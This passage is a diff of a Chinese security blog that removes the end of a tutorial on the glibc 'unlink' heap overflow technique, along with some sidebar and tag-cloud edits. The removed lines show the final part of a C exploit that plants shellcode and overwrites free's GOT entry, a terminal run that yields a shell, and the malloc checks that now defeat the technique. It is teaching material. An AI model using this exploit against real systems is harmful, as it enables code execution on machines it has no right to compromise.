first chunk */</div><div class="line">        *( (void **)p ) = (void *)( DUMMY );</div><div class="line">        p += 4;</div><div class="line">        /* the bk field of the first chunk */</div><div class="line">        *( (void **)p ) = (void *)( DUMMY );</div><div class="line">        p += 4;</div><div class="line">        /* the fd_nextsize field of the first chunk */</div><div class="line">        *( (void **)p ) = (void *)( DUMMY );</div><div class="line">        p += 4;</div><div class="line">        /* the bk_nextsize field of the first chunk */</div><div class="line">        *( (void **)p ) = (void *)( DUMMY );</div><div class="line">        p += 4;</div><div class="line">        /* Copy the shellcode */</div><div class="line">        memcpy( p, shellcode, strlen(shellcode) );</div><div class="line">        p += strlen( shellcode );</div><div class="line">        /* Padding- 16 bytes for prev_size,size,fd and bk of second chunk. 16 bytes for fd,bk,fd_nextsize,bk_nextsize </div><div class="line">        of first chunk */</div><div class="line">        memset( p, 'B', (680 - 4*4) - (4*4 + strlen(shellcode)) );</div><div class="line">        p += ( 680 - 4*4 ) - ( 4*4 + strlen(shellcode) );</div><div class="line">        /* the prev_size field of the second chunk. Just make sure its an even number ie) its prev_inuse bit is unset */</div><div class="line">        *( (size_t *)p ) = (size_t)( DUMMY &amp; ~PREV_INUSE );</div><div class="line">        p += 4;</div><div class="line">        /* the size field of the second chunk. By setting size to -4, we trick glibc malloc to unlink second chunk.*/</div><div class="line">        *( (size_t *)p ) = (size_t)( -4 );</div><div class="line">        p += 4;</div><div class="line">        /* the fd field of the second chunk. It should point to free - 12. -12 is required since unlink function</div><div class="line">        would do + 12 (FD-&gt;bk). This helps to overwrite the GOT entry of free with the address we have overwritten in </div><div class="line">        second chunk's bk field (see below) */</div><div class="line">        *( (void **)p ) = (void *)( FUNCTION_POINTER - 12 );</div><div class="line">        p += 4;</div><div class="line">        /* the bk field of the second chunk. It should point to shell code address.*/</div><div class="line">        *( (void **)p ) = (void *)( CODE_ADDRESS );</div><div class="line">        p += 4;</div><div class="line">        /* the terminating NUL character */</div><div class="line">        *p = '';</div><div class="line"></div><div class="line">        /* the execution of the vulnerable program */</div><div class="line">        execve( argv[0], argv, NULL );</div><div class="line">        return( -1 );</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>执行上面的漏洞利用程序，可以触发一个新的shell!</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/unlink$ gcc -g -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib -Wl,--dynamic-linker=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib/ld-linux.so<span class="number">.2</span></div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/unlink$ gcc -g -o <span class="built_in">exp</span> <span class="built_in">exp</span>.c</div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/unlink$ ./<span class="built_in">exp</span> </div><div class="line">$ ls</div><div class="line">cmd  <span class="built_in">exp</span>  <span class="built_in">exp</span>.c  vuln  vuln.c</div><div class="line">$ <span class="built_in">exit</span></div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/unlink$</div></pre></td></tr></table></figure>
-<p><u>保护</u>: 现如今，’glibc malloc’经过许多年的发展已经被强化了(hardened)，unlink已经技术无法成功执行。为了防御unlink技术带来的堆溢出，’glibc malloc’加入了下面的检查：</p>
-<ul>
-<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3947" target="_blank" rel="external">两次释放(Double Free)</a>: 释放已经处于空闲状态的chunk是禁止的。当攻击者试图将’second’ chunk的大小覆盖为-4, 其PREV_INUSE位被复位，意味着’first’已经处于空闲状态。这时’glibc malloc’会抛出一个两次释放错误。</li>
-</ul>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</div><div class="line">    &#123;</div><div class="line">      errstr = <span class="string">"double free or corruption (!prev)"</span>;</div><div class="line">      <span class="keyword">goto</span> errout;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
-<ul>
-<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3954" target="_blank" rel="external">无效的next size</a>: 下一个chunk的大小介于8字节与arena的总系统内存之间。当攻击者试图将’second’ chunk的大小覆盖为-4,’glibc malloc’会抛出一个无效的next size错误</li>
-</ul>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</div><div class="line">        || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</div><div class="line">      &#123;</div><div class="line">        errstr = <span class="string">"free(): invalid next size (normal)"</span>;</div><div class="line">        <span class="keyword">goto</span> errout;</div><div class="line">      &#125;</div></pre></td></tr></table></figure>
-<ul>
-<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1414" target="_blank" rel="external">损坏的双链表</a>： 前一个chunk的fd和下一个chunk的bk必须指向当前被unlinked的chunk。当攻击者分别将fd和bk覆盖为-12与shellcode地址， free和(shellcode地址+8)没有指向当前被unlinked的chunk(‘second’)。 ‘glibc malloc’会抛出一个损坏的双链表错误.</li>
-</ul>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                     </div><div class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P);</div></pre></td></tr></table></figure>
-<p><u>注意</u>：为了更好的演示，漏洞程序在编译的时候没有添加以下保护机制：</p>
-<p><a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">ASLR</a><br><a href="https://en.wikipedia.org/wiki/NX_bit" target="_blank" rel="external">NX</a><br><a href="https://isisblogs.poly.edu/2011/06/01/relro-relocation-read-only/" target="_blank" rel="external">RELRO(ReLocation Read-Only)</a></p>
-<p>参考</p>
-<p><a href="http://phrack.org/issues/57/8.html" target="_blank" rel="external">vudo malloc tricks</a></p>
-<hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/heapoverflow-unlink" target="_blank" rel="external">Linux(X86)漏洞利用系列-Unlink堆溢出)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用<span class="article-category-count">14</span></a>
-
-
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Heap/">Heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
-
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
 
 
   <nav id="page-nav">
@@ -1069,6 +1047,18 @@ Multiple Arena：
     </ul>
     <div class="widget">
       <ul>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170808/rowhammer/">神乎其神的Rowhammer：用比特位翻转实现云虚拟机夺权</a></h6>
+          <!--  <span>八月 8, 2017</span> -->
+            </div>
+
+          </li>
         
           <li class="clearfix">
 
@@ -1250,18 +1240,6 @@ Multiple Arena：
 
           </li>
         
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170504/lbr-ret2dir/">利用LBR特性检测ret2dir攻击</a></h6>
-          <!--  <span>五月 4, 2017</span> -->
-            </div>
-
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -1272,7 +1250,7 @@ Multiple Arena：
   <div class="widget-wrap">
     <h3 class="widget-title">分类导航</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Hypervisor安全/">Hypervisor安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/主流会议/">主流会议</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制分析/">二进制分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内核安全/">内核安全</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内核完整性/">内核完整性</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/博士之路/">博士之路</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/名人课堂/">名人课堂</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/学术专家/">学术专家</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/恶意代码/">恶意代码</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/硬件特性/">硬件特性</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/硬件虚拟化/">硬件虚拟化</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统安全/">系统安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统安全科普/">系统安全科普</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化原理/">虚拟化原理</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化综合/">虚拟化综合</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机快照/">虚拟机快照</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机记录与重放/">虚拟机记录与重放</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机迁移/">虚拟机迁移</a><span class="category-list-count">3</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Hypervisor安全/">Hypervisor安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/主流会议/">主流会议</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制分析/">二进制分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内核安全/">内核安全</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内核完整性/">内核完整性</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/博士之路/">博士之路</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/名人课堂/">名人课堂</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/学术专家/">学术专家</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/恶意代码/">恶意代码</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/硬件特性/">硬件特性</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/硬件虚拟化/">硬件虚拟化</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统安全/">系统安全</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统安全科普/">系统安全科普</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化原理/">虚拟化原理</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化综合/">虚拟化综合</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机快照/">虚拟机快照</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机记录与重放/">虚拟机记录与重放</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机迁移/">虚拟机迁移</a><span class="category-list-count">3</span></li></ul>
     </div>
   </div>
 
@@ -1282,7 +1260,7 @@ Multiple Arena：
   <div class="widget-wrap">
     <h3 class="widget-title">标签导航</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ASLR/" style="font-size: 12.31px;">ASLR</a> <a href="/tags/ASPLOS/" style="font-size: 10px;">ASPLOS</a> <a href="/tags/Attack/" style="font-size: 12.31px;">Attack</a> <a href="/tags/Binary/" style="font-size: 10.77px;">Binary</a> <a href="/tags/CFI/" style="font-size: 12.31px;">CFI</a> <a href="/tags/Cloud/" style="font-size: 10px;">Cloud</a> <a href="/tags/Compiler/" style="font-size: 10px;">Compiler</a> <a href="/tags/Conference/" style="font-size: 12.31px;">Conference</a> <a href="/tags/Conferences/" style="font-size: 10px;">Conferences</a> <a href="/tags/Course/" style="font-size: 13.08px;">Course</a> <a href="/tags/Exception/" style="font-size: 10px;">Exception</a> <a href="/tags/Exploit/" style="font-size: 16.92px;">Exploit</a> <a href="/tags/Forensics/" style="font-size: 10px;">Forensics</a> <a href="/tags/HAV/" style="font-size: 12.31px;">HAV</a> <a href="/tags/Hardware/" style="font-size: 13.85px;">Hardware</a> <a href="/tags/Heap/" style="font-size: 10.77px;">Heap</a> <a href="/tags/Hooking/" style="font-size: 10px;">Hooking</a> <a href="/tags/Instrumentation/" style="font-size: 10.77px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 13.85px;">Introspection</a> <a href="/tags/JOP/" style="font-size: 10px;">JOP</a> <a href="/tags/KVM/" style="font-size: 16.15px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 17.69px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.08px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.08px;">Linux</a> <a href="/tags/Malware/" style="font-size: 15.38px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.08px;">Memory</a> <a href="/tags/Migration/" style="font-size: 11.54px;">Migration</a> <a href="/tags/Monitoring/" style="font-size: 13.08px;">Monitoring</a> <a href="/tags/NX/" style="font-size: 10px;">NX</a> <a href="/tags/Overflow/" style="font-size: 10.77px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Paper/" style="font-size: 11.54px;">Paper</a> <a href="/tags/Ph-D/" style="font-size: 10.77px;">Ph.D</a> <a href="/tags/Ppaerwriting/" style="font-size: 10px;">Ppaerwriting</a> <a href="/tags/Professor/" style="font-size: 12.31px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 14.62px;">QEMU</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/ROP/" style="font-size: 10.77px;">ROP</a> <a href="/tags/Rootkit/" style="font-size: 11.54px;">Rootkit</a> <a href="/tags/Rowhammer/" style="font-size: 10px;">Rowhammer</a> <a href="/tags/SYSCALL/" style="font-size: 10px;">SYSCALL</a> <a href="/tags/Sandbox/" style="font-size: 10.77px;">Sandbox</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Snapshot/" style="font-size: 10px;">Snapshot</a> <a href="/tags/Stack/" style="font-size: 10.77px;">Stack</a> <a href="/tags/Syscall/" style="font-size: 10px;">Syscall</a> <a href="/tags/System/" style="font-size: 18.46px;">System</a> <a href="/tags/Systemcall/" style="font-size: 11.54px;">Systemcall</a> <a href="/tags/TSX/" style="font-size: 10px;">TSX</a> <a href="/tags/TrustZone/" style="font-size: 10px;">TrustZone</a> <a href="/tags/VT-x/" style="font-size: 10px;">VT-x</a> <a href="/tags/Valgrind/" style="font-size: 10px;">Valgrind</a> <a href="/tags/Virtualization/" style="font-size: 19.23px;">Virtualization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a> <a href="/tags/XEN/" style="font-size: 13.08px;">XEN</a>
+      <a href="/tags/ASLR/" style="font-size: 12.31px;">ASLR</a> <a href="/tags/ASPLOS/" style="font-size: 10px;">ASPLOS</a> <a href="/tags/Attack/" style="font-size: 12.31px;">Attack</a> <a href="/tags/Binary/" style="font-size: 10.77px;">Binary</a> <a href="/tags/CFI/" style="font-size: 12.31px;">CFI</a> <a href="/tags/Cloud/" style="font-size: 10px;">Cloud</a> <a href="/tags/Compiler/" style="font-size: 10px;">Compiler</a> <a href="/tags/Conference/" style="font-size: 12.31px;">Conference</a> <a href="/tags/Conferences/" style="font-size: 10px;">Conferences</a> <a href="/tags/Course/" style="font-size: 13.08px;">Course</a> <a href="/tags/Exception/" style="font-size: 10px;">Exception</a> <a href="/tags/Exploit/" style="font-size: 16.92px;">Exploit</a> <a href="/tags/Forensics/" style="font-size: 10px;">Forensics</a> <a href="/tags/HAV/" style="font-size: 12.31px;">HAV</a> <a href="/tags/Hardware/" style="font-size: 13.85px;">Hardware</a> <a href="/tags/Heap/" style="font-size: 10.77px;">Heap</a> <a href="/tags/Hooking/" style="font-size: 10px;">Hooking</a> <a href="/tags/Instrumentation/" style="font-size: 10.77px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 13.85px;">Introspection</a> <a href="/tags/JOP/" style="font-size: 10px;">JOP</a> <a href="/tags/KVM/" style="font-size: 16.15px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 17.69px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.08px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.08px;">Linux</a> <a href="/tags/Malware/" style="font-size: 15.38px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.08px;">Memory</a> <a href="/tags/Migration/" style="font-size: 11.54px;">Migration</a> <a href="/tags/Monitoring/" style="font-size: 13.08px;">Monitoring</a> <a href="/tags/NX/" style="font-size: 10px;">NX</a> <a href="/tags/Overflow/" style="font-size: 10.77px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Paper/" style="font-size: 11.54px;">Paper</a> <a href="/tags/Ph-D/" style="font-size: 10.77px;">Ph.D</a> <a href="/tags/Ppaerwriting/" style="font-size: 10px;">Ppaerwriting</a> <a href="/tags/Professor/" style="font-size: 12.31px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 14.62px;">QEMU</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/ROP/" style="font-size: 10.77px;">ROP</a> <a href="/tags/Rootkit/" style="font-size: 11.54px;">Rootkit</a> <a href="/tags/Rowhammer/" style="font-size: 10.77px;">Rowhammer</a> <a href="/tags/SYSCALL/" style="font-size: 10px;">SYSCALL</a> <a href="/tags/Sandbox/" style="font-size: 10.77px;">Sandbox</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Snapshot/" style="font-size: 10px;">Snapshot</a> <a href="/tags/Stack/" style="font-size: 10.77px;">Stack</a> <a href="/tags/Syscall/" style="font-size: 10px;">Syscall</a> <a href="/tags/System/" style="font-size: 18.46px;">System</a> <a href="/tags/Systemcall/" style="font-size: 11.54px;">Systemcall</a> <a href="/tags/TSX/" style="font-size: 10px;">TSX</a> <a href="/tags/TrustZone/" style="font-size: 10px;">TrustZone</a> <a href="/tags/VT-x/" style="font-size: 10px;">VT-x</a> <a href="/tags/Valgrind/" style="font-size: 10px;">Valgrind</a> <a href="/tags/Virtualization/" style="font-size: 19.23px;">Virtualization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a> <a href="/tags/XEN/" style="font-size: 13.08px;">XEN</a>
     </div>
   </div>
 
